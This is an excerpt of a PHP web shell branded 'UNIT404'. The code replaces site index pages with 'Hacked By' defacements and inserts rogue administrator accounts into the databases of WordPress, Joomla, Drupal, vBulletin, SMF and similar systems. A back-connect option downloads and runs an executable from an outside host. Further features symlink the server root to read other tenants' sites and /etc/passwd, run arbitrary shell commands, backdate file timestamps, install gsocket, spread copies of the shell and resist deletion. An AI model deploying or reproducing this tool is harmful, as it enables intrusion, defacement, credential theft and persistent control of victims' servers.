<textarea name=index rows='19' cols='103'><title>Hacked By UNIT404</title><b>Hacked By UNIT404</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['UNIT4046'])){
$s0levisible="Powered By UNIT404";
$dbu = $_POST['UNIT4046'];
$path = $_POST['UNIT4045'];
$fname = $_POST['UNIT4044'];
$dbn = $_POST['UNIT4047'];
$dbp = $_POST['UNIT4048'];
$dbh = $_POST['UNIT4049'];
$index = $_POST['UNIT40410'];
...
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>UNIT404</title><b>UNIT404</b></textarea><br>
...
$dbp = $_POST['UNIT4044'];
$dbh = $_POST['UNIT4045'];
$index = $_POST['UNIT4046'];
$prefix = $_POST['UNIT4047'];
$index=str_replace("\'","'",$index);
...
<title>Hacked By UNIT404</title><b>Hacked By UNIT404</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['UNIT4046'])){
$mybb_dbh = $_POST['UNIT4046'];
$mybb_dbu = $_POST['UNIT4047'];
$mybb_dbn = $_POST['UNIT4048'];
$mybb_dbp = $_POST['UNIT4049'];
$mybb_index = $_POST['UNIT40410'];
...
if(isset($_POST['UNIT4041'])&&!empty($_POST['UNIT4041'])){
$lang = $_POST['UNIT4041'];
$ip = $_POST['UNIT4042'];
$port = $_POST['UNIT4043'];
$arg = ($_POST['UNIT4044']=='bind'?$port:$port.' '.$ip);
$tmpdir = UNIT404_TEMPDIR;
...
$out = UNIT404Ex("$lang $name $arg $os");
...
if($lang=='bcwin'){
$UNIT404 = new UNIT404CURL();
$s = $UNIT404->Send('https://hcklst.pages.dev/haxor.exe');
$tmpdir = UNIT404_TEMPDIR;
$f = @fopen($tmpdir.'/bcwin.exe','w+');
@fwrite($f, $s);
@fclose($f);
$out = UNIT404Ex($tmpdir."/bcwin.exe ".$_POST['UNIT4042']." ".$_POST['UNIT4043']);
}
if($lang=='php'){
...
UNIT404_Create_A_Tag('pwchanger',$vals);
echo '</h3></center>';
if(isset($_POST['UNIT4041'])&&$_POST['UNIT4041']=='wp'){
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'UNIT404', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'UNIT404@nasa.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form>';
if ($_POST['UNIT4042'] && $_POST['UNIT4042'] == '>>'){
$localhost = $_POST['UNIT4043'];
$database = $_POST['UNIT4044'];
$username = $_POST['UNIT4045'];
$password = $_POST['UNIT4046'];
$admin = $_POST['UNIT4048'];
$SQL = $_POST['UNIT4049'];
$prefix = $_POST['UNIT40410'];
...
if($_POST['UNIT4042'] && $_POST['UNIT4042'] == 'joomla'){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'UNIT404', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'NeverDie@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['UNIT4041'] && $_POST['UNIT4041'] =='>>'){
$localhost = $_POST['UNIT4043'];
$database = $_POST['UNIT4044'];
$username = $_POST['UNIT4045'];
$password = $_POST['UNIT4046'];
...
if($_POST['UNIT4044'] && $_POST['UNIT4044'] == 'vb'){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'UNIT404', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'NeverDie@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if($_POST['UNIT4041'] && $_POST['UNIT4041'] == '>>'){
$localhost = $_POST['UNIT4042'];
$database = $_POST['UNIT4043'];
$username = $_POST['UNIT4045'];
$password = $_POST['UNIT4046'];
$prefix = $_POST['UNIT4047'];
$admin = $_POST['UNIT4048'];
...
if(isset($_POST['UNIT4045']) && $_POST['UNIT4045'] == 'phpbb'){
...
if(isset($_POST['UNIT4046']) && $_POST['UNIT4046'] == 'whmcs'){
...
if(isset($_POST['UNIT4047']) && $_POST['UNIT4047'] == 'mybb'){
...
if(isset($_POST['UNIT4048']) && $_POST['UNIT4048'] == 'nuke'){
...
if(isset($_POST['UNIT4049']) && $_POST['UNIT4049'] == 'drupal'){
...
$table = array('td1' =>
 ...
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'UNIT404', 'inputSize' => '50'),
 'td7' =>
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','NeverDie@fbi.gov','filtered_html','1','Europe/Berlin','NeverDie@fbi.gov')") or die(mysqli_error($conn));
...
if(isset($_POST['UNIT40410']) && $_POST['UNIT40410'] == 'smf'){
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','NeverDie@fbi.gov')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
function UNIT404MakePwd(){if(_UNIT404_file_exists("/etc/virtual/domainowners")||(_UNIT404_file_exists("/etc/named.conf")&&_UNIT404_file_exists("/etc/valiases"))){
...
function UNIT404GetDomains($state = false){
	$state = "named.conf";
	$lines = array();
	$lines = _UNIT404_file('/etc/named.conf');
	if(!$lines){
		...
		if(!$lines){
			...
			$state = "named";
			if(!$lines && $state){
				$lines = _UNIT404_file('/etc/passwd');
				$state = "passwd";
			}
		}
	}
...
function UNIT404CreateParentFolder(){
	// disabled - no longer creates data folder
	return;
}
function UNIT404symlink(){
UNIT404head();
UNIT404Num(9,10);
UNIT404CreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __UNIT404_DATA_FOLDER__);
...
if(isset($_POST['UNIT4042'])&&($_POST['UNIT4042']=='symperl'||$_POST["UNIT4042"]=="sympy")){
	...
	@chmod($cginame,0755);
	echo __pre();
	$resource = UNIT404Ex("{$lang} {$cginame} {$sympath}",false,true,true);
	if(strlen($resource) == 0){
		echo UNIT404iFrameCreator('cgiUNIT404/'.$cginame);
	}else{
		echo $resource;
	}
}
if(isset($_POST['UNIT4044']) && $_POST['UNIT4044']=='SymFile'){
if(function_exists('symlink')||_UNIT404_can_runCommand(true,true)){
UNIT404Num(9,10);
echo __pre().'
...
<input type="text" name="symfile" placeholder="Example : UNIT404.txt" size="60"/>
<p><input type="submit"value=" " name="symlink" /></p></form></center>';
$path = $_POST['UNIT4045'];
$symname = $_POST['UNIT4046'];
$solevisible58 = $_POST['UNIT4047'];
if($solevisible58){
$new_name = str_replace(".", "_", basename($symname));
$rand_dir = $new_name.rand(111,9999);
$sym_dir = 'UNIT404symlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
UNIT404cgihtaccess('sym', $sym_dir, $symname);
_UNIT404_symlink("$path","$sym_dir/$symname");
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__UNIT404_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
if(isset($_POST['UNIT4042']) && $_POST['UNIT4042']=='symphp'){
$cant_symlink = true;
if(function_exists('symlink')||_UNIT404_can_runCommand(false,false)){
@mkdir('UNIT404symlink',0777);
UNIT404cgihtaccess('sym','UNIT404symlink/');
_UNIT404_symlink('/','UNIT404symlink/root');
...
if(_UNIT404_file_exists("/etc/named.conf") && !_UNIT404_file_exists("/etc/virtual/domainowners") && _UNIT404_file_exists("/etc/valiases/")){
echo "<center>";
$lines = array();
$anony_domains = array();
...
$domains = UNIT404GetDomains();
$lines =$domains["lines"];
$state = $domains["state"];
$is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
$can_runcmd = _UNIT404_can_runCommand(false,false);
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#000F01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#000000;font-weight:bold;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__UNIT404_DATA_FOLDER__.'/UNIT404symlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
foreach($lines as $line){
	...
	if($anonymous){
		...
		if(strlen(trim($domain)) > 2 && $state != "passwd"){
			if(!_UNIT404_file_exists('/etc/valiases/'.$domain, false))continue;
			if($is_posix){
				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
				$owner = $user["name"];
			}elseif($can_runcmd){
				$owner = UNIT404Ex("stat -c '%U' /etc/valiases/".$domain,false,false);
			}
		}
	}
	if(!$anonymous){
...
$is_direct = false;
$makepwd = UNIT404MakePwd();
if(_UNIT404_file_exists("/etc/virtual/domainowners")){
	$makepwd = "/home/{user}/public_html";
	$is_direct = true;
}
$sole = _UNIT404_file("/etc/virtual/domainowners");
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#000F01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#000000;font-weight:bold;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__UNIT404_DATA_FOLDER__.'/UNIT404symlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
	...
	$passwd = _UNIT404_file("/etc/passwd");
	if($passwd){
		$html = "";
		$is_named = false;
		$users = array();
		...
		if(!$site_domains){
			$site_domains = UNIT404Ex("ls /etc/virtual/");
			$site_domains = explode("\n", $site_domains);
			if(!$site_domains){
				$site_domains = _UNIT404_file("/etc/named.conf");
...
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['UNIT4043'])?htmlspecialchars($_POST['UNIT4043']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'unit404.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['UNIT4045']) && ($_POST['UNIT4045'] == '>>')){
$dirzip = $_POST['UNIT4043'];
$zipfile = $_POST['UNIT4044'];
if($GLOBALS['sys']!='unix'&&_UNIT404_can_runCommand(true,true)){
UNIT404Ex("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="red">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&_UNIT404_can_runCommand(true,true)){
UNIT404Ex("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
echo __pre().'<center><p>Done -> <b><font color="red">'.$zipfile.'</font></b></p></center>';
}elseif(class_exists('ZipArchive')){
if(__UNIT404ziper($dirzip, $zipfile)){
...
function __UNIT404ziper($source,$destination){
...
function UNIT404_Create_A_Tag($action,$vals){
$nulls = array();
...
function UNIT404iFrameCreator($f,$width='100%',$height='600px'){
return('<iframe src="'.__UNIT404_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class UNIT404CURL {
public $headers;
public $user_agent;
...
$this->path = UNIT404_TEMPDIR.'/UNIT404_cookies.txt';
...
if (_UNIT404_file_exists($cookie_file,false)) {
...
function UNIT404terminalExec(){
	...
	$current_path = '';
	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['UNIT4041'], $match)){
		if(empty($match[1])){
			$match[1] = $match[2];
		}
		$current_path = UNIT404Ex("cd ".addslashes($match[1]).$seperator.$pwd);
		$current_path = str_replace("\\", "/", $current_path);
	}
	$out = UNIT404Ex($cmd.$_POST['UNIT4041'], true);
...
function UNIT404doActions(){
	...
	if(isset($_POST['UNIT4041']))$_POST['UNIT4041'] = rawurldecode($_POST['UNIT4041']);
	if(isset($_POST['UNIT4042']))$_POST['UNIT4042'] = rawurldecode($_POST['UNIT4042']);
	$action = $_POST["UNIT4043"];
	...
	if($action == "rename" || $action == "move"){
		...
		$_POST['UNIT4041'] = trim($_POST['UNIT4041']);
		$UNIT4041_escape = addslashes($_POST["UNIT4041"]);
		if($_POST["UNIT4043"] == "rename"){
			$_POST['UNIT4042'] = basename($_POST['UNIT4042']);
		}
		if(!empty($_POST['UNIT4042'])){
			$cmd_rename = false;
			if($chdir_fals&&$UNIT404_canruncmd){
				if(_UNIT404_is_writable($_POST['UNIT4041'])){
					$cmd_rename = true;
					$UNIT4041_escape = addslashes($UNIT4041_decoded);
					UNIT404Ex("cd '".addslashes($_POST['c'])."';mv '".$UNIT4041_escape."' '".addslashes($_POST['UNIT4042'])."'");
				}
			}
			if(!file_exists($_POST['UNIT4042'])){
				if(@rename($_POST['UNIT4041'], $_POST['UNIT4042'])||$cmd_rename){
					echo "done";
				}else{
					echo "no";
				}
		...
		if(is_dir($_POST["UNIT4041"])){
			$dir = str_replace('//', '/', $_POST["UNIT4041"]);
			$dir = explode('/', $dir);
			...
			$name = basename($_POST["UNIT4041"]);
		}
		$dir = dirname($_POST["UNIT4041"]);
		if($dir == "."){
			$dir = $_POST["c"]."/";
		}
		if(is_file($_POST["UNIT4041"])){
			@copy($_POST["UNIT4041"], $_POST["UNIT4042"]);
			echo("done");
		}elseif(is_dir($_POST["UNIT4041"])){
			if(!is_dir($_POST["UNIT4042"])){
				mkdir($_POST["UNIT4042"], 0755, true);
			}
			copy_paste($dir, $name , $_POST["UNIT4042"] . "/");
			echo("done");
		}
	}elseif($action == "modify"){
		if( !empty($_POST['UNIT4041']) ) {
			$time = strtotime($_POST['UNIT4041']);
			if($time){
				$touched = false;
				if($chdir_fals&&$UNIT404_canruncmd){
					UNIT404Ex("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['UNIT4041']))."' '".addslashes($_POST['UNIT4042'])."'");
					$touched = true;
				}
				if(!@touch($_POST['UNIT4042'],$time,$time)&&!$touched){
					echo 'no';
				}else{
					echo 'ok';
				}
...
function UNIT404GetConfig(){
$cms = $_POST['UNIT4041'];
$path = trim($_POST['UNIT4042']);
$config = array(
...
if($cms == "drupal"){
	...
	$file=$path.$file;
	if(@is_file($file)||_UNIT404_is_dir($file,"-e")){
	}else{
		$cms = 'drupal2';
	}
}
...
if(@is_dir($path)||_UNIT404_is_dir($path)){
$file=$path.$file;
}elseif(@is_file($path)||_UNIT404_is_dir($path,"-e")){
$file=$path;
}else{
return false;
}
...
' . $script_code . ' @unlink(__FILE__); ?>';
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'create') {
        $wp_path = $_POST['UNIT4042'] ?? '';
        $username = $_POST['UNIT4043'] ?? '';
        $password = $_POST['UNIT4044'] ?? '';
        $email = $_POST['UNIT4045'] ?? '';
        $role = $_POST['UNIT4046'] ?? 'administrator';
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'list') {
        $wp_path = $_POST['UNIT4042'] ?? $default_wp;
    ...
    <div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128101;</span></div>
    <div style="background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;border:1px solid #ffffff;margin-bottom:20px;">
    ...
    <div style="background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:20px;border-radius:12px;border:1px solid #3498db;">
...
// ============ REDIRECT MANAGER ============
function UNIT404redirect_manager() {
    UNIT404head();
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'add') {
        $from = trim($_POST['UNIT4042'] ?? '');
        $to = trim($_POST['UNIT4043'] ?? '');
        $code = $_POST['UNIT4044'] ?? '301';
        if (!empty($to)) {
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'delete') {
        $idx = intval($_POST['UNIT4042']);
        $content = @file_get_contents($htaccess);
    ...
    <div style="text-align:center;color:#ffffff;font-size:24px;margin:10px 0;">&#8595;</div>
    ...
    <div style="background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:20px;border-radius:12px;border:1px solid #333;">
...
function UNIT404gsocket_install() {
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'install') {
        ...
        <div style="background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:35px;border-radius:15px;border:1px solid #0f0;margin-bottom:25px;box-shadow:0 10px 30px rgba(0,255,0,0.1);">
...
function UNIT404defense_shell() {
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'spread') {
        $spread_links = [];
        $max_spread = 20;
        $max_depth = 5;
        $counter = 0;
        ...
        echo '</div>';
    } elseif (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'check') {
        ...
        echo '</div>';
    } elseif (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'clean') {
        @unlink($link_file);
        ...
        <div style="background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;border:1px solid #ffffff;">
...
function UNIT404antidelete() {
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'start') {
        if (!$is_running) {
...
while true; do
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'stop') {
        if (@file_exists($pid_file)) {
            $pid = trim(@file_get_contents($pid_file));
            if ($pid) {
    ...
    echo '<div style="background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;border:1px solid #FFF;">';
...
function UNIT404shell_finder() {
    ...
    if (isset($_POST['UNIT4041']) && $_POST['UNIT4041'] == 'scan') {
        $start_dir = $_POST['UNIT4042'] ?? ($_SERVER['DOCUMENT_ROOT'] ?? getcwd());
        $max_depth = intval($_POST['UNIT4043'] ?? 5);
        $found = [];
        $scanned_dirs = 0;
        $scanned_files = 0;
        ...
        echo '<div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128202;</span></div>';
        echo '<h2 style="color:#ffffff;text-align:center;margin-bottom:25px;text-shadow:0 0 10px rgba(155,89,182,0.5);">Scan Results</h2>';
        echo "<div style='background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;margin-bottom:20px;border:1px solid #ffffff;box-shadow:0 8px 25px rgba(155,89,182,0.15);'>";
        echo "<div style='display:flex;justify-content:space-around;text-align:center;flex-wrap:wrap;gap:15px;'>";
        echo "<div style='background:#0d0d1a;padding:20px 30px;border-radius:10px;border:1px solid #444;'><div style='font-size:28px;color:#ffffff;font-weight:bold;'>{$scanned_dirs}</div><div style='color:#888;font-size:12px;margin-top:5px;'>&#128193; Folders</div></div>";
        ...
        if (empty($found)) {
            echo "<div style='background:linear-gradient(135deg,#1e3a1e 0%,#0d2d0d 100%);padding:30px;border-radius:12px;text-align:center;border:1px solid #ffffff;'>";
            ...
            echo "<div style='background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;margin-bottom:20px;border:1px solid #00ff07;'>";
            ...
            echo "<div style='background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;border:1px solid #00ff07;'>";
            echo "<h4 style='color:#ffe800;margin:0 0 15px 0;'>&#128203; Detail Found:</h4>";
            echo "<div style='overflow-x:auto;'><table style='width:100%;border-collapse:collapse;font-size:13px;'><tr style='background:#0d0d1a;'><th style='padding:12px;border:1px solid #333;color:#ffffff;text-align:left;'>Path</th><th style='padding:12px;border:1px solid #333;color:#ffffff;text-align:left;width:120px;'>Keyword</th></tr>";
            foreach ($found as $s) {
        ...
        echo '<div style="padding:30px;max-width:600px;margin:0 auto;">
        <div style="text-align:center;margin-bottom:20px;"><span style="font-size:40px;">&#128270;</span></div>
        <h2 style="color:#ffffff;text-align:center;margin-bottom:10px;text-shadow:0 0 10px rgba(155,89,182,0.5);">Shell Finder</h2>
        ...
        <div style="background:linear-gradient(to bottom, #1c1c1c 0, #1c1c1c 55%, #000000 100%);padding:25px;border-radius:12px;border:1px solid #ffffff;box-shadow:0 8px 25px rgba(155,89,182,0.15);">
        <form onsubmit="g(\'shell_finder\',null,\'scan\',this.start_dir.value,this.depth.value);return false;">
        <div style="margin-bottom:20px;">
            <label style="display:block;color:#ffffff;margin-bottom:8px;font-weight:bold;">&#128193; Start Directory</label>
            <input type="text" name="start_dir" value="'.htmlspecialchars($default_dir).'" style="width:100%;padding:12px;background:#0d0d1a;border:1px solid #ffffff;border-radius:8px;color:#000;font-size:14px;box-sizing:border-box;font-weight:bold;">
        </div>
        <div style="margin-bottom:25px;">
            <label style="display:block;color:#ffffff;margin-bottom:8px;font-weight:bold;">&#128202; Scan Depth</label>
            <select name="depth" style="width:100%;padding:12px;background:#0d0d1a;border:1px solid #ffffff;border-radius:8px;color:#000;font-size:14px;font-weight:bold;">
        ...
        <button type="submit" style="width:100%;padding:14px;background:linear-gradient(135deg, #081e00 0%, #12cd00 100%);color:#FFF;border:1px solid #ffffff;cursor:pointer;font-size:16px;border-radius:8px;font-weight:bold;transition:all 0.3s ease;box-shadow:0 4px 15px rgba(155,89,182,0.3);">&#128269; START SCAN</button>
        </form>
        </div>
        </div>';
    }echo '</div>';
...
if(empty($_POST['a']))
if(isset($default_action) && function_exists('UNIT404' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'FilesMan2';//'FilesMan';
if(!empty($_POST['a']) && function_exists('UNIT404' . $_POST['a']))
call_user_func('UNIT404' . $_POST['a']);
exit;
?>
